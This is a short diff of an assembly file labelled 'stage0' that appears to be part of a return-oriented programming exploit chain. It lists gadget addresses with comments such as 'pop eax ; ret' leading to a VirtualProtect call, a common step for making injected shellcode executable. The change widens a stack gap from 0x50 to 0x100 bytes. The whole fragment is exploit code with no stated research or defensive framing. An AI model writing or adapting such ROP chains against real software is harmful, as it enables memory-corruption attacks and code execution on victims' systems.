@@ -20,8 +20,8 @@ stage0:
         dd 40FCB5h          ; add esp, 4 ; ret
         dd 0            ;D eID, do not overwrite!
         dd 58A6CFh          ; push eax ; pop eax ; ret 4
-        dd 4215E5h          ; add esp, 0x50 ; ret                   ; space for VirtualProtect
-        times 54h db 0                                              ; and other calls
+        dd 6281CEh          ; add esp, 0x100 ; ret                  ; space for VirtualProtect
+        times 104h db 0                                             ; and other calls
         
         dd 40142Bh          ; pop eax ; ret
         dd virtualProtect
